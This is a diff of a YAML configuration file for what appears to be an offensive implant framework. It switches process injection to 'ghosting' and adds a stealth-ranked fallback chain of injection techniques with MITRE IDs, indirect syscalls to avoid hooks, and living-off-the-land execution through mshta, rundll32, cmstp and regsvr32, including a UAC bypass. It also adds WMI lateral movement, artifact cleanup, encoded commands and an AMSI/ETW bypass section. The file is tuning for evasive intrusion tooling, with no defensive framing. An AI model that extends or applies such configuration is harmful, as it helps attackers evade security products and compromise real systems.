@@ -68,8 +68,17 @@ reflective_loader:
 # Process Injection - ADVANCED
 process_injection:
   enabled: true
-  technique: "early_bird"       # Inject before main thread executes
+  technique: "ghosting"         # Process Ghosting - most evasive (2021+)
   target_process: "RuntimeBroker.exe"
+  fallback_chain:               # Fallback order by stealth
+    - "ghosting"                # Stealth: 10, MITRE: T1055.012
+    - "doppelganging"           # Stealth: 9,  MITRE: T1055.013
+    - "transacted_hollowing"    # Stealth: 9,  MITRE: T1055.012
+    - "module_stomping"         # Stealth: 8,  MITRE: T1055.001
+    - "early_bird_apc"          # Stealth: 8,  MITRE: T1055.004
+    - "phantom_dll"             # Stealth: 8,  MITRE: T1055.001
+    - "thread_hijack"           # Stealth: 7,  MITRE: T1055.003
+    - "syscall"                 # Stealth: 9,  MITRE: T1055
   fallback_processes:
     - "SearchProtocolHost.exe"
     - "backgroundTaskHost.exe"
@@ -83,8 +92,30 @@ process_injection:
   doppelgang_config:
     use_ntfs_transactions: true
     rollback_transaction: true
-  ghosting: true                # Process ghosting (simplified)
+  ghosting: true                # Process ghosting (2021+ technique)
+  ghosting_config:
+    pending_delete: true
+    create_section_before_close: true
   syscall_mode: "direct"        # Direct syscalls to avoid hooks
+  use_indirect_syscalls: true   # Hell's Gate / SysWhispers style
+
+# Living-off-the-Land (LOTL) Integration
+lotl:
+  enabled: true
+  preferred_bins:               # Execution preference order
+    - "wmi"                     # WMI Process Create (T1047)
+    - "mshta"                   # HTA execution (T1218.005)
+    - "rundll32"                # DLL execution (T1218.011)
+    - "cmstp"                   # INF install, UAC bypass (T1218.003)
+    - "regsvr32"                # SCT execution (T1218.010)
+  fallback_enabled: true
+  auto_fallback_on_block: true  # AI: switch to LOTL if injection blocked
+  lateral_movement:
+    use_wmi_over_psexec: true   # WMI yerine psexec kullanma
+    use_wmic: true
+    use_dcom: false
+  cleanup_artifacts: true       # Temp files sil
+  encode_commands: true         # Base64 encoded commands
 
 # AMSI/ETW Bypass - FULL + NTDLL UNHOOK
 security_bypass:
